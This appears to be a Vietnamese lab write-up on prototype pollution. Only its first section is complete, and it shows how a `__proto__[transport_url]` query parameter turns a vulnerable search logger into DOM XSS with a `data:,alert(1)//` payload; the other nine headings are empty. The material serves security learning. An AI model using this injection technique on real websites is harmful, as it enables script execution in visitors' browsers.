# 1. DOM XSS via client-side prototype pollution
Trong source code của home page, nhận thấy có hai resource script `deparam.js` và `searchLogger.js`. Trong đó, `deparam.js` có chức năng chuyển query string thành một object chức các tham số trong đó.

Nội dung của `searchLogger.js`:
```
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};

    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }

    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

window.addEventListener("load", searchLogger);
```
Từ đoạn code trên, ta thấy nếu có thể thiết lập giá trị `config.transport_url=data:,alert(1)//` thì sẽ tạo được thẻ script và execute lệnh alert.

Gửi request `/?search=x&__proto__[abc]=hello`, sau đó vào tab console nhập `Object.prototype.abc`, ta được giá trị `hello`. Như vậy, chức năng search chính là một prototype pollution source. Ta thay đổi request thành `/?search=x&__proto__[transport_url]=data:,alert(1)//` rồi submit, kết quả bài lab được giải.

Nguyên nhân lệnh alert được execute là vì `config.transport_url` trong trường hợp này có giá trị `undefined`, do đó javascript sẽ tiếp tục tìm lên prototype của nó, đến khi gặp `Object.prototype.transport_url` có giá trị là `data:,alert(1)//` thì nó sẽ dừng lại. Kết quả, một thẻ script có thể thực thi lệnh alert được inject vào website.

# 2. DOM XSS via an alternative prototype pollution vector

# 3. Client-side prototype pollution via flawed sanitization

# 4. Client-side prototype pollution in third-party libraries

# 5. Client-side prototype pollution via browser APIs

# 6. Privilege escalation via server-side prototype pollution

# 7. Detecting server-side prototype pollution without polluted property reflection

# 8. Bypassing flawed input filters for server-side prototype pollution

# 9. Remote code execution via server-side prototype pollution

# 10. Exfiltrating sensitive data via server-side prototype pollution

